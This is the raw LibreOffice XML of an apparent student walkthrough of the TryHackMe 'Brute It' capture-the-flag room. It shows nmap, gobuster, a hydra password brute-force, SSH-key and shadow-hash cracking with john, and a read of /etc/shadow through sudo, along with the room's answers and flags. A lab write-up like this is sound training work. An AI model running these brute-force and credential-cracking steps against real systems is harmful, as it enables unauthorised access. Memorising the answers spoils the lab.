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9000001D6CD58EA13.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002DD0000021BDF52D873.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002D9000001A852AE35D8.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002D900000236BFEDAFA9.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000054E0000015CA575D4F9.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002E10000023A4F1D00C6.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000033C000002168C8B42BA.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002840000020CF224B7B3.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000035800000269261DE461.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002DB0000023EC403FA54.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002CB0000020D7AAE38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059" officeooo:rsid="000eb178" officeooo:paragraph-rsid="000a71c5"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="0001e4fb" officeooo:paragraph-rsid="0001e4fb" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="00043e23" officeooo:paragraph-rsid="00043e23" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="0005da80" officeooo:paragraph-rsid="0005da80" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="000a4d93" officeooo:paragraph-rsid="000a4d93" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="000a71c5" officeooo:paragraph-rsid="000a71c5" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="000eb178" officeooo:paragraph-rsid="000a71c5" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" officeooo:rsid="001821e7" officeooo:paragraph-rsid="001821e7" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0001e4fb" officeooo:paragraph-rsid="0001e4fb" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#f0f6fc" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0014b62c" officeooo:paragraph-rsid="0014b62c" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#f0f6fc" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001b8801" officeooo:paragraph-rsid="0014b62c" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#f0f6fc" loext:opacity="100%" style:font-name="C059" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001b8801" officeooo:paragraph-rsid="001b8801" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="C059"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="C059" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="C059" fo:font-size="12pt" officeooo:rsid="0014b62c" officeooo:paragraph-rsid="0014b62c" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="C059" fo:font-size="12pt" officeooo:paragraph-rsid="00135fea" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00028eb7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eb178"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" officeooo:rsid="001821e7"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" officeooo:rsid="001b880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9a1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ute It</text:p>
      <text:p text:style-name="P2">Learn how to brute, hash cracking and escalate privileges in this box! <text:s text:c="2"/></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Level: Easy</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Search for open ports using nmap.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">nmap -sS -A &lt;IP&gt;</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="Image1" text:anchor-type="char" svg:x="0.7311in" svg:y="0.0126in" svg:width="4.2728in" svg:height="3.0819in" draw:z-index="0"><draw:image xlink:href="Pictures/10000000000002CB0000020D7AAE383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swer the following then: </text:p>
      <text:p text:style-name="P10">How many ports are open? </text:p>
      <text:p text:style-name="P10">2</text:p>
      <text:p text:style-name="P10">What version of SSH is running?</text:p>
      <text:p text:style-name="P10">OpenSSH 7.6p1</text:p>
      <text:p text:style-name="P10">What version of Apache is running?</text:p>
      <text:p text:style-name="P10">2.4.29</text:p>
      <text:p text:style-name="P10">Which Linux distribution is running?</text:p>
      <text:p text:style-name="P10">Ubuntu</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P3">Search for hidden directories on web server.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">gobuster dir -u &lt;<text:span text:style-name="T1">IP&gt;</text:span> -w /usr/share/wordlists/dirb/common.txt</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="Image2" text:anchor-type="char" svg:x="1.3311in" svg:y="0.0835in" svg:width="3.9756in" svg:height="2.8661in" draw:z-index="1"><draw:image xlink:href="Pictures/100000000000035800000269261DE4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hat is the hidden directory?</text:p>
      <text:p text:style-name="P3">/<text:span text:style-name="T1">admin</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Task2</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Go to Admin page. View page source. Find the username</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="Image3" text:anchor-type="char" svg:x="1.5862in" svg:y="0.089in" svg:width="3.1646in" svg:height="2.5752in" draw:z-index="2"><draw:image xlink:href="Pictures/10000000000002840000020CF224B7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x="1.7252in" svg:y="0.052in" svg:width="2.7846in" svg:height="1.7957in" draw:z-index="3"><draw:image xlink:href="Pictures/100000000000033C000002168C8B42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or the password,</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">first go to wordlists -h </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">then,</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">hydra -l admin -P rockyou.txt &lt;IP&gt; http-post-form “/admin/:user=^USER^&amp;pass=^PASS^:F=invalid”</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">we find the password</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr3" draw:name="Image5" text:anchor-type="char" svg:width="6.6929in" svg:height="1.7146in" draw:z-index="4"><draw:image xlink:href="Pictures/100000000000054E0000015CA575D4F9.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame></text:p>
      <text:p text:style-name="P5"><text:soft-page-break/></text:p>
      <text:p text:style-name="P5">What is the user:password of the admin panel?</text:p>
      <text:p text:style-name="P5">admin:xavier</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">now login <text:span text:style-name="T7">to the admin login page</text:span>. And we find our RSA key &amp; Web flag...also a new username</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">THM{brut3_f0rce_is_e4sy}</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">Download the rsa key and save as id_rsa (auto). </text:p>
      <text:p text:style-name="P6">cd Downloads</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">locate ssh2john.py</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">opt/john/ssh2john.py id_rsa &gt; rsa.txt</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr2" draw:name="Image6" text:anchor-type="char" svg:x="1.4701in" svg:y="0.0937in" svg:width="3.8783in" svg:height="3.0457in" draw:z-index="5"><draw:image xlink:href="Pictures/10000000000002DB0000023EC403FA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is will turn the rsa into a hash format so we can crack it with John the Ripper</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">john rsa.txt –wordlist=/usr/share/wordlists/rockyou.txt</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">This gives us the private key passphrase.</text:p>
      <text:p text:style-name="P6"><draw:frame draw:style-name="fr2" draw:name="Image7" text:anchor-type="char" svg:x="1.522in" svg:y="0.0602in" svg:width="4.0661in" svg:height="3.1571in" draw:z-index="6"><draw:image xlink:href="Pictures/10000000000002D900000236BFEDAFA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We log in to john’s computer.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">chmod 600 id_rsa</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">ssh -i id_rsa <text:a xlink:type="simple" xlink:href="mailto:john@10.112.185.180" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">john@10.112.185.180</text:a></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P9">Voila! <text:s/>We’re in!</text:p>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="Image8" text:anchor-type="char" svg:width="3.4307in" svg:height="2.5228in" draw:z-index="7"><draw:image xlink:href="Pictures/10000000000002DD0000021BDF52D87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ere’s the user.txt file and we can cat it</text:p>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr1" draw:name="Image9" text:anchor-type="char" svg:width="3.7638in" svg:height="2.189in" draw:z-index="8"><draw:image xlink:href="Pictures/10000000000002D9000001A852AE35D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--</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">nmap -p- -sV -T4 10.112.185.180</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P15"><text:span text:style-name="T3">gobuster dir -u http://10.112.185.180 -w /usr/share/wordlists/dirb/common.txt</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.185.180 http-post-form "/admin/index.php:user=^USER^&amp;pass=^PASS^:Username or password invalid"</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">sudo python /usr/share/john/ssh2john.py id_rsa &gt; hash</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">john --wordlist=/usr/share/wordlists/rockyou.txt hash</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P16"><text:span text:style-name="T3">---</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T3">P</text:span><text:span text:style-name="T2">rivilege Escalation</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2">sudo -l</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2">cat /etc/shadow</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:soft-page-break/><text:span text:style-name="T2">the first line is the root hash and let’s save it to </text:span><text:span text:style-name="T4">roothash</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2">echo root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbL. &gt; roothash</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2">john --wordlist=/usr/share/wordlists/rockyou.txt </text:span><text:span text:style-name="T5">root</text:span><text:span text:style-name="T2">hash</text:span></text:p>
      <text:p text:style-name="P16"><draw:frame draw:style-name="fr2" draw:name="Image10" text:anchor-type="char" svg:x="1.2665in" svg:y="0.0854in" svg:width="4.2638in" svg:height="3.298in" draw:z-index="9"><draw:image xlink:href="Pictures/10000000000002E10000023A4F1D00C6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16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text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T2">Lastly,</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2">sudo cat /root/root.txt</text:span></text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr1" draw:name="Image11" text:anchor-type="char" svg:width="4.639in" svg:height="2.9902in" draw:z-index="10"><draw:image xlink:href="Pictures/10000000000002D9000001D6CD58EA13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2:21:08.625932209</meta:creation-date>
    <dc:date>2026-03-12T11:35:33.675681062</dc:date>
    <meta:editing-duration>PT1H23M46S</meta:editing-duration>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="11" meta:object-count="0" meta:page-count="5" meta:paragraph-count="56" meta:word-count="272" meta:character-count="1919" meta:non-whitespace-character-count="1697"/>
  </office:meta>
</office:document-meta>
</file>